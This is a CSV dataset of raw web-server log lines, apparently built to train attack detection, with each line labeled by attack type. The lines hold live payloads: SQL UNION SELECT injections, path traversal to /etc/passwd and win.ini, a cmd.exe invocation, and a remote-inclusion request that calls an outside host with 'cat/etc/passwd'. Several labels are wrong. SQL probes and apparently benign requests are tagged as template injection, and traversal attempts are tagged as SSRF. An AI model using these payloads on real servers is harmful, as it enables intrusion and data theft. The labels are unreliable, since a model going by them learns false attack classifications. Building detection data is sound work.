source,text
"5.101.40.234 - - [23/Jan/2019:06:58:11 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20fuWO HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:19:38:49 +0330] ""GET /phpmyadmin/index.php?option=weblinks&Itemid=2&catid=-1 UNION SELECT 0,1,2,368612312108,4,5,6,7,8,9,10,11-- HTTP/1.1"" 200 8625 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.189.196.244 - - [24/Mar/2018:22:59:23 +0330] ""GET http://www.wikipedia.org HTTP/1.1"" 200 2687 ""-"" ""-"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:55:05 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20CXbJ&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.1"" 403 269 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.172.152.13 - - [24/Mar/2018:19:26:56 +0330] ""GET /\x80../\x80../\x80../\x80../\x80../\x80../windows/win.ini HTTP/1.1"" 404 332 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:26:15 +0330] ""GET /manager/?showimage=') UNION SELECT 'pixelpost_15rc1.nasl-1331904443.jpg' as id, 1002540574 as headline, 364335024 as datetime, 1587584354 as body, 501427275 as category, 1177792721 as image-- HTTP/1.1"" 404 286 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:41:14 +0330] ""GET ../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.238 - - [24/Mar/2018:21:55:28 +0330] ""GET .\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/winnt/win.ini HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.118 - - [16/Mar/2012:19:24:00 +0330] ""GET /gepi/gestion/savebackup.php?filename=http://192.168.202.118:8080/tzHfyzKbOmspVm?&cmd=cat/etc/passwd HTTP/1.1"" 404 1167 ""-"" ""-"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:41:12 +0330] ""GET /search?NS-query-pat=../../../../../../../../../etc/passwd HTTP/1.1"" 404 2518 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.118 - - [16/Mar/2012:17:04:29 +0330] ""GET /gepi/gestion/savebackup.php?filename=http://192.168.202.118:8080/2AibfAcZmac8?&cmd=cat/etc/passwd HTTP/1.1"" 404 1166 ""-"" ""-"" ""-""",file upload
"192.168.202.110 - - [16/Mar/2012:15:37:20 +0330] ""GET /cgi-bin/index.php?action=view&module=resourcesmodule&id=0 UNION SELECT -1,'exponent_0964.nasl','Nessus test','O:8:""stdClass"":3:{s:3:""mod"";s:15:""resourcesmodule"";s:3:""src"";s:20:""@random41940ceb78dbb"";s:3:""int"";s:0:"""";}',7,0,0,0,0,0,0 -- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:42:04 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../etc/passwd HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:16:47:06 +0330] ""GET /cgi-bin/index.php?option=weblinks&Itemid=2&catid=-1 UNION SELECT 0,1,2,640661099207,4,5,6,7,8,9,10,11-- HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.172.152.13 - - [24/Mar/2018:19:27:16 +0330] ""GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../ HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:49:18 +0330] ""GET /search?NS-query-pat=../../../../../../../../../etc/passwd HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.118 - - [16/Mar/2012:19:35:54 +0330] ""GET /gepi/gestion/savebackup.php?filename=http://192.168.202.118:8080/gHL9IL?&cmd=cat/etc/passwd HTTP/1.1"" 404 1166 ""-"" ""-"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:40:54 +0330] ""GET /<script>foo</script> HTTP/1.1"" 403 241 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"2.178.123.118 - - [24/Jan/2019:12:32:33 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50 HTTP/1.1"" 200 5 ""https://www.zanbil.ir/filter/p62,b1"" ""Opera/9.80 (Windows NT 6.1; U; Edition Next; en) Presto/2.9.196 Version/12.00"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:56:32 +0330] ""GET /image/{{basketItem.id}}?type=productModel%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"2.178.123.118 - - [24/Jan/2019:12:30:54 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50 HTTP/1.1"" 200 5 ""https://www.zanbil.ir/filter/b749"" ""Opera/9.80 (Windows NT 6.1; U; Edition Next; en) Presto/2.9.196 Version/12.00"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:44:47 +0330] ""GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:44 +0330] ""GET /rpc/..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
